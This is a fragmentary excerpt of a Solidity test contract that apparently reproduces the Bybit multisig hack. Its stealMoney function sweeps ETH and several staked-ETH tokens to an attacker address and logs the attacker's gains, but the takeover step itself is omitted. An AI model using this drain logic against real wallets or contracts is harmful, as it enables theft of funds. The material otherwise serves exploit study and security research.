...
contract Bybit is BaseTestWithBalanceLog {
    ...
    //     console2.log("After attack, multisigWallet balance left:", address(multisigWallet).balance / 1 ether, "ETH");
    //     console2.log("Attacker earned balance:", address(this).balance / 1 ether, "ETH");
    // }
    ...
    function stealMoney() public {
        ...
        // Sweep ETH
        sweepETH(attacker);
        console2.log("Attacker ETH Balance After exploit:", address(attacker).balance / 1 ether, "ETH");

        // Sweep ERC20
        sweepERC20(mETH, attacker);
        console2.log("Attacker mETH Balance After exploit:", IERC20(mETH).balanceOf(attacker) / 1 ether, "ETH");
        sweepERC20(cmETH, attacker);
        console2.log("Attacker cmETH Balance After exploit:", IERC20(cmETH).balanceOf(attacker) / 1 ether, "ETH");
        sweepERC20(stETH, attacker);
        console2.log("Attacker stETH Balance After exploit:", IERC20(stETH).balanceOf(attacker) / 1 ether, "ETH");
        vm.stopPrank();
    }
